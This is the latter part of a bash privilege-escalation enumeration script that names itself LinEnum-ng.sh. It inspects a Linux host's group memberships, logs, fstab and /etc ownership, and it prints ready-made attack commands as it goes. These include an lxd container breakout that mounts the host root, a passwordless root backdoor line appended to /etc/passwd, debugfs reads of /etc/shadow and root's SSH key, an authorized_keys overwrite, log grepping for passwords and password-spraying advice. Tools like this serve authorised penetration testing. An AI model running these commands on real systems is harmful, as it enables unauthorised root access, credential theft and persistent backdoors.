    echo -e "${CYAN}    # Once inside: cd /mnt/root/root && id${NC}"
    echo -e ""
    echo -e "${CYAN}    # Option B: Using uploaded alpine image${NC}"
    echo -e "${CYAN}    lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine${NC}"
    echo -e "${CYAN}    lxc init alpine privesc -c security.privileged=true${NC}"
    echo -e "${CYAN}    lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true${NC}"
    echo -e "${CYAN}    lxc start privesc${NC}"
    echo -e "${CYAN}    lxc exec privesc /bin/sh${NC}"
    echo -e ""
    echo -e "${CYAN}    # Become real root on host:${NC}"
    echo -e "${CYAN}    chroot /mnt/root /bin/bash${NC}"
    echo -e "${CYAN}    # OR add backdoor user:${NC}"
    echo -e "${CYAN}    echo 'root::0:0:root:/root:/bin/bash' >> /mnt/root/etc/passwd${NC}"
    echo -e ""
else
    echo -e "${GREEN}Not in lxd/lxc group${NC}"
fi

# ============================================================================
# DISK GROUP PRIVILEGE ESCALATION
# ============================================================================
echo -e "\n${YELLOW}[+] ${NC}Disk group membership check:"
if echo "$current_groups" | grep -q disk || groups | grep -q disk; then
    echo -e "${LRED}╔══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${LRED}║ \033[1;31;103mUSER IS IN DISK GROUP!                              ║\033[0m${NC}"
    echo -e "${LRED}║ ╚ PRIVILEGE ESCALATION POSSIBLE!                                 ║${NC}"
    echo -e "${LRED}╚══════════════════════════════════════════════════════════════════╝${NC}"

    echo -e "\n${LMAGENTA}[+] ${NC}Available disk devices:"
    df -h 2>/dev/null

    echo -e "\n${LMAGENTA}[+] ${NC}Block devices:"
    lsblk 2>/dev/null || ls -lah /dev/sd* /dev/xvd* /dev/vd* 2>/dev/null | head -10

    echo -e "\n${LMAGENTA}[+] ${NC}EXPLOITATION COMMANDS:"
    echo -e "${CYAN}    # Find root partition (usually /dev/sda1, /dev/xvda1, etc.)${NC}"
    echo -e "${CYAN}    df -h${NC}"
    echo -e ""
    echo -e "${CYAN}    # Option 1: Read sensitive files (e.g., /etc/shadow)${NC}"
    echo -e "${CYAN}    debugfs /dev/sda1${NC}"
    echo -e "${CYAN}    # Inside debugfs:${NC}"
    echo -e "${CYAN}    cat /etc/shadow${NC}"
    echo -e "${CYAN}    cat /root/.ssh/id_rsa${NC}"
    echo -e ""
    echo -e "${CYAN}    # Option 2: Write SSH key to root's authorized_keys${NC}"
    echo -e "${CYAN}    debugfs -w /dev/sda1${NC}"
    echo -e "${CYAN}    # Inside debugfs:${NC}"
    echo -e "${CYAN}    dump /home/\$(whoami)/.ssh/id_rsa.pub /root/.ssh/authorized_keys${NC}"
    echo -e ""
    echo -e "${CYAN}    # Option 3: Direct disk access${NC}"
    echo -e "${CYAN}    strings /dev/sda1 | grep -i password${NC}"
    echo -e ""
else
    echo -e "${GREEN}Not in disk group${NC}"
fi

# ============================================================================
# ADM GROUP PRIVILEGE ESCALATION
# ============================================================================
echo -e "\n${YELLOW}[+] ${NC}ADM group membership check:"
if echo "$current_groups" | grep -q adm || groups | grep -q adm; then
    echo -e "${LRED}╔══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${LRED}║ \033[1;31;103mUSER IS IN ADM GROUP!                               ║\033[0m${NC}"
    echo -e "${LRED}║ ╚ CAN READ ALL SYSTEM LOGS - PASSWORD HUNTING POSSIBLE!          ║${NC}"
    echo -e "${LRED}╚══════════════════════════════════════════════════════════════════╝${NC}"

    echo -e "\n${LMAGENTA}[+] ${NC}Readable log files:"
    ls -lah /var/log 2>/dev/null | head -20

    echo -e "\n${LMAGENTA}[+] ${NC}Searching logs for passwords/credentials (first 20 results):"
    grep -ri "password\|passwd\|pwd\|credential" /var/log/*.log 2>/dev/null | head -20

    echo -e "\n${LMAGENTA}[+] ${NC}Searching logs for user activity:"
    grep -ri "user\|username\|login" /var/log/auth.log /var/log/secure 2>/dev/null | tail -15

    echo -e "\n${LMAGENTA}[+] ${NC}Searching logs for cron jobs:"
    grep -ri "cron\|CRON" /var/log/syslog /var/log/cron* 2>/dev/null | tail -15

    echo -e "\n${LMAGENTA}[+] ${NC}USEFUL COMMANDS:"
    echo -e "${CYAN}    # Search all logs for passwords:${NC}"
    echo -e "${CYAN}    grep -ri 'password\\|user\\|cred' /var/log/* 2>/dev/null${NC}"
    echo -e ""
    echo -e "${CYAN}    # Check auth logs:${NC}"
    echo -e "${CYAN}    cat /var/log/auth.log | grep -i 'fail\\|success\\|accept'${NC}"
    echo -e ""
    echo -e "${CYAN}    # Check command history from logs:${NC}"
    echo -e "${CYAN}    cat /var/log/auth.log | grep 'command='${NC}"
    echo -e ""
else
    echo -e "${GREEN}Not in adm group${NC}"
fi

# ============================================================================
# OTHER PRIVILEGED GROUPS CHECK
# ============================================================================
echo -e "\n${YELLOW}[+] ${NC}Other potentially dangerous group memberships:"
dangerous_groups="video audio plugdev netdev cdrom tape dialout sudo wheel shadow staff"
found_dangerous=0

for group in $dangerous_groups; do
    if echo "$current_groups" | grep -q "$group" || groups | grep -q "$group"; then
        echo -e "${LRED}Found: $group${NC}"
        found_dangerous=1

        case $group in
            video)
                echo -e "${YELLOW}     Can access framebuffer, potentially capture screen${NC}"
                ;;
            audio)
                echo -e "${YELLOW}     Can access audio devices${NC}"
                ;;
            plugdev)
                echo -e "${YELLOW}     Can mount external devices${NC}"
                ;;
            netdev)
                echo -e "${YELLOW}     Can manage network interfaces${NC}"
                ;;
            shadow)
                echo -e "\033[1;31;103mCan read /etc/shadow!\033[0m"

                ;;
        esac
    fi
done

if [ $found_dangerous -eq 0 ]; then
    echo -e "${GREEN}No other dangerous groups detected${NC}"
fi

# ============================================================================
# SYSTEM CONFIGURATION FILES
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║ SYSTEM CONFIGURATION FILES                                ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}NFS exports:"
if [ -r /etc/exports ]; then
    nfs_exports=$(cat /etc/exports 2>/dev/null | grep -v "^#")
    if [ ! -z "$nfs_exports" ]; then
        echo -e "${CYAN}$nfs_exports${NC}"
    else
        echo -e "${GREEN}No NFS exports configured${NC}"
    fi
else
    echo -e "${GREEN}No NFS exports or cannot read${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}/etc/fstab:"
cat /etc/fstab 2>/dev/null | grep -v "^#"

echo -e "\n${YELLOW}[+] ${NC}Credentials in /etc/fstab:"
fstab_creds=$(grep -i "username\|password\|cred" /etc/fstab 2>/dev/null)
if [ "$fstab_creds" ]; then
    echo -e "\033[1;31;103mCredentials in fstab!\033[0m"

    echo -e "${CYAN}$fstab_creds${NC}"
else
    echo -e "${GREEN}No credentials in fstab${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Files in /etc not owned by root (first 20):"
etc_non_root=$(find /etc -type f \! -user root 2>/dev/null | head -20)
if [ ! -z "$etc_non_root" ]; then
    echo "$etc_non_root" | while read file; do
        ls -lah "$file" 2>/dev/null | while read line; do
            echo -e "${LRED}$line${NC}"
        done
    done
else
    echo -e "${GREEN}All /etc files owned by root${NC}"
fi

# ============================================================================
# USERNAME HUNT
# ============================================================================
if [ -n "$USERNAME" ]; then
    echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${LBLUE}║ USERNAME HUNT: $USERNAME$(printf '%*s' $((43 - ${#USERNAME})) '')║${NC}"
    echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

    echo -e "\n${YELLOW}[+] ${NC}Files with '${USERNAME}' in the filename:"
    name_hits=$(find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o \
        -iname "*${USERNAME}*" -print 2>/dev/null)
    if [ -n "$name_hits" ]; then
        echo "$name_hits" | while read f; do
            echo -e "${LRED}$f${NC}"
            ls -lah "$f" 2>/dev/null
        done
    else
        echo -e "${GREEN}No files found with that name${NC}"
    fi

    echo -e "\n${YELLOW}[+] ${NC}Files containing '${USERNAME}' in their content: ${CYAN}(may take some time)${NC}"
    content_hits=$(grep -rIl --exclude="LinEnum-ng.sh" \
        --exclude-dir={proc,sys,dev} \
        "$USERNAME" / 2>/dev/null | head -40)
    if [ -n "$content_hits" ]; then
        echo "$content_hits" | while read f; do
            echo -e "${LRED}$f${NC}"
            grep -n --color=never "$USERNAME" "$f" 2>/dev/null | head -5 | while read match; do
                echo -e "${CYAN}  $match${NC}"
            done
        done
    else
        echo -e "${GREEN}No files found containing that string${NC}"
    fi
fi

# ============================================================================
# FINAL SUMMARY
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║ ENUMERATION COMPLETE                                      ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${LMAGENTA}[!] IMPORTANT REMINDERS:${NC}"
echo -e "${LMAGENTA}    • Review all SUID/SGID binaries using gtfobinSUID${NC}"
echo -e "${LMAGENTA}    • sudo -l as well${NC}"
echo -e "${LMAGENTA}    • Verify kernel exploit${NC}"
echo -e "${LMAGENTA}    • Suspicious directory? Recursively hunt for sensitive strings:${NC}"
echo -e "${CYAN}        grep -RniE pass.word./id_rsa/secret/token/api_key/credential <path>${NC}"

if [ -z "$PASSWORD" ]; then
    echo -e "\n\033[1;31;103m[!] You ran without -p. If you found a password during this scan, re-run with: $0 -p PASSWORD\033[0m"
    echo -e "${LMAGENTA}    sudo -l with valid creds often reveals more than passwordless checks!${NC}"
fi

if [ -n "$PASSWORD" ]; then
    echo -e "\n\033[1;31;103m[!] PASSWORD SPRAY REMINDER: Try the password you have against ALL other users!\033[0m"
    echo -e "${LMAGENTA}    People often reuse passwords. Try logging in or su-ing as every user found above:${NC}"
    echo -e "${CYAN}        su - <username>          # try each login-shell user${NC}"
    echo -e "${CYAN}        ssh <username>@localhost  # if SSH is open${NC}"
    echo -e "${CYAN}    Users with login shells found above are the highest-priority targets.${NC}"
fi

if [ -z "$USERNAME" ]; then
    echo -e "\n${YELLOW}[*] Tip: re-run with -u <username> to hunt all files related to a specific user.${NC}"
fi

echo -e "\n${YELLOW}Scan completed at:${NC}"; date
